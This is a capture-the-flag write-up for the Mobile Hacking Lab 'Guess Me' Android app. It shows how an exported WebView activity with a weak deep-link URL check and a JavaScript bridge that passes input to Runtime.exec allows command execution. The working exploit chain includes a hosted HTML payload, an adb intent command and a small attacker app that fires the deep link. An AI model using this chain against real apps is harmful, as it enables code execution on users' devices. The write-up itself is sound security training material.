---
title:  Mobile Hacking Lab — Guess Me | Deep Link to RCE

published: 2026-01-13
description:  ⭐ NANO IS HERE ⭐
tags: [Android, Mobile Security, Deep Link, WebView, RCE, CTF, MobileHackingLab]
image: "./guess.jpg"
category: Android Security

draft: false
---

> Cover image source: [Source](./guess.jpg)

Introduction
------------

HEy Ya hackers 

In this write-up we will solve the `Mobile Hacking Lab - Guess Me` challenge.

The app looks like a simple number guessing game at first. I started by checking the APK to see if there was anything interesting behind the game.

While looking through the Android components I found a `WebView` Activity that can be opened using a custom Deep Link.

The Activity also uses a JavaScript Interface that communicates with native Android code.

By putting these things together we can reach command execution inside the app sandbox.

Let's start.

Step 1 — Finding the WebView Activity
--------------------------------------

After installing the APK I opened it in JADX and started checking the Activities.

**Before this you should to be install the apk in emullator or ur phone what u use for testing and analysis fun and logic the apk like what this it do :)**


Yallah bena na revers the apk using Jadx  The package name is ```com.mobilehackinglab.guessme``` and going to the  ```AndroidManifest.xml``` until to see the  activities i checked so i get it two activity 

**There are two Activities in the app. The one that caught my attention was:**
```
com.mobilehackinglab.guessme.WebviewActivity
```
After this i will going to chack is for this activity is exported or not 
**Checking the AndroidManifest.xml we can see that the Activity is exported:**

```
<activity
    android:name="com.mobilehackinglab.guessme.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
<activity
    android:name="com.mobilehackinglab.guessme.WebviewActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data
            android:scheme="mhl"
            android:host="mobilehackinglab"/>
    </intent-filter>
</activity>
```

Well, in the MainActivity we have just the game. So, let's move on to the WebviewActivity: 

**It just a game when checked in MAinActivity i see that lets to see the WebviewActivity**

```
private final void handleDeepLink(Intent intent) {
    Uri uri = intent != null ? intent.getData() : null;
    if (uri != null) {
        if (isValidDeepLink(uri)) {
            loadDeepLink(uri);
        } else {
            loadAssetIndex();
        }
    }
}

private final boolean isValidDeepLink(Uri uri) {
    if ((!Intrinsics.areEqual(uri.getScheme(), "mhl") && !Intrinsics.areEqual(uri.getScheme(), "https")) || !Intrinsics.areEqual(uri.getHost(), "mobilehackinglab")) {
        return false;
    }
    String queryParameter = uri.getQueryParameter("url");
    return queryParameter != null && StringsKt.endsWith$default(queryParameter, "mobilehackinglab.com", false, 2, (Object) null);
}

private final void loadDeepLink(Uri uri) {
    String fullUrl = String.valueOf(uri.getQueryParameter("url"));
    WebView webView = this.webView;
    WebView webView2 = null;
    if (webView == null) {
        Intrinsics.throwUninitializedPropertyAccessException("webView");
        webView = null;
    }
    webView.loadUrl(fullUrl);
    WebView webView3 = this.webView;
    if (webView3 == null) {
        Intrinsics.throwUninitializedPropertyAccessException("webView");
    } else {
        webView2 = webView3;
    }
    webView2.reload();
}

private final void loadAssetIndex() {
    WebView webView = this.webView;
    if (webView == null) {
        Intrinsics.throwUninitializedPropertyAccessException("webView");
        webView = null;
    }
    webView.loadUrl("file:///android_asset/index.html");
}

/* compiled from: WebviewActivity.kt */
@Metadata(d1 = {"\u0000\u001c\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0002\b\u0002\b\u0086\u0004\u0018\u00002\u00020\u0001B\u0005¢\u0006\u0002\u0010\u0002J\u0010\u0010\u0003\u001a\u00020\u00042\u0006\u0010\u0005\u001a\u00020\u0004H\u0007J\u0010\u0010\u0006\u001a\u00020\u00072\u0006\u0010\b\u001a\u00020\u0004H\u0007¨\u0006\t"}, d2 = {"Lcom/mobilehackinglab/guessme/WebviewActivity$MyJavaScriptInterface;", "", "(Lcom/mobilehackinglab/guessme/WebviewActivity;)V", "getTime", "", "Time", "loadWebsite", "", "url", "app_debug"}, k = 1, mv = {1, 9, 0}, xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
/* loaded from: classes3.dex */
public final class MyJavaScriptInterface {
    public MyJavaScriptInterface() {
    }

    @JavascriptInterface
    public final void loadWebsite(String url) {
        Intrinsics.checkNotNullParameter(url, "url");
        WebView webView = WebviewActivity.this.webView;
        if (webView == null) {
            Intrinsics.throwUninitializedPropertyAccessException("webView");
            webView = null;
        }
        webView.loadUrl(url);
    }

    @JavascriptInterface
    public final String getTime(String Time) {
        Intrinsics.checkNotNullParameter(Time, "Time");
        try {
            Process process = Runtime.getRuntime().exec(Time);
            InputStream inputStream = process.getInputStream();
            Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");
            Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
            BufferedReader reader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
            String readText = TextStreamsKt.readText(reader);
            reader.close();
            return readText;
        } catch (Exception e) {
            return "Error getting time";
        }
    }
}
```
After see this code i think we can get **RCE** from  DeepLinks there 
```
private final void loadAssetIndex() {
    WebView webView = this.webView;
    if (webView == null) {
        Intrinsics.throwUninitializedPropertyAccessException("webView");
        webView = null;
    }
    webView.loadUrl("file:///android_asset/index.html");
}

```
After i see the *index.html* file that the app use in the *assets* directory that apktool drop us Simple content  it Returning  java code in WebviewActivity

```
private final boolean isValidDeepLink(Uri uri) {
    if ((!Intrinsics.areEqual(uri.getScheme(), "mhl") && !Intrinsics.areEqual(uri.getScheme(), "https")) || !Intrinsics.areEqual(uri.getHost(), "mobilehackinglab")) {
        return false;
    }
    String queryParameter = uri.getQueryParameter("url");
    return queryParameter != null && StringsKt.endsWith$default(queryParameter, "mobilehackinglab.com", false, 2, (Object) null);
}
```
Here we can see how the app validates the Deep Link.

The `mhl` part is the **scheme** and `mobilehackinglab` is the **host**. The `url` is the parameter that the app checks.

The important part is that the value of `url` only needs to **end with** `mobilehackinglab.com`.

So we can use:

```text
mhl://mobilehackinglab?url=mobilehackinglab.com
```
and there a called ``MyJavaScriptInterface``

```
public final class MyJavaScriptInterface {  
    @JavascriptInterface  
    public final String getTime(String time) {  
        Intrinsics.checkNotNullParameter(time, "time");  
        try {  
            Process process = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", time});  
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));  
            StringBuilder output = new StringBuilder();  
            while (true) {  
                String it = reader.readLine();  
                if (it != null) {  
                    output.append(it).append("\n");  
                } else {  
                    reader.close();  
                    String sb = output.toString();  
                    Intrinsics.checkNotNullExpressionValue(sb, "toString(...)");  
                    return StringsKt.trim((CharSequence) sb).toString();  
                }  
            }  
        } catch (Exception e) {  
            return "Error getting time and listing files";  
        }  
    }  
}
```

At this point we can edit the original `index.html` and change the command that is being executed.
```
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Hacking Lab</title>
</head>

<body>

<h3>Welcome</h3>

<div id="output">Loading...</div>

<button onclick="openSite()">Open Website</button>

<script>

function openSite() {
    location.href = "https://www.mobilehackinglab.com/";
}

const commandResult = AndroidBridge.getTime("whoami");

document.getElementById("output").textContent =
    "Command output: " + commandResult;

</script>

</body>
</html>
```
it can also  ``webView3.addJavascriptInterface(new MyJavaScriptInterface(), "AndroidBridge");``

This line exposes the `MyJavaScriptInterface` class to the WebView.

Because of this connection JavaScript running inside the page can call the methods provided by the Java class through the `AndroidBridge` object.

Now we need to host our modified `index.html` so the application can access it.

For a quick setup I used Python's built-in HTTP server:

```bash
python3 -m http.server 9000
```
Now we can send the Intent using **ADB**

``adb shell am start -a android.intent.action.VIEW -d "mhl://mobilehackinglab?url=http://192.168.1.3:9000/index.html?mobilehackinglab.com" com.mobilehackinglab.guessme/.WebviewActivity``

The command worked and returned the current user:

```text
u0_a415
```

ADB works for testing the RCE but we can trigger the same RCE from another app since `WebviewActivity` is exported.

I used a small app to send the Intent and load our `index.html` from the local server

`MainActivity.java`:

For this setup I used a **LAN** server to host the `index.html` file and let the app access it.

```text
http://192.168.1.3:9000/index.html

```
**i write  code in ```MainActivity.java```  for get RCE**
```
package com.lautaro.exploitme;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = new Intent(Intent.ACTION_VIEW);

        intent.setData(Uri.parse(
            "mhl://mobilehackinglab?url=http://192.168.1.3:9000/index.html?mobilehackinglab.com"
        ));

        intent.setClassName(
            "com.mobilehackinglab.guessme",
            "com.mobilehackinglab.guessme.WebviewActivity"
        );

        startActivity(intent);
        finish();
    }
}
```
``AndroidManifest.xml``
```
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <application
        android:theme="@style/Theme.ExploitMe"
        android:label="@string/app_name">

        <activity
            android:name=".MainActivity"
            android:exported="true">

            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>

        </activity>

    </application>

</manifest>
```
After building and installing the app we can launch it and trigger the RCE through the exported WebviewActivity

**AFra7ooo we are get RCE :)**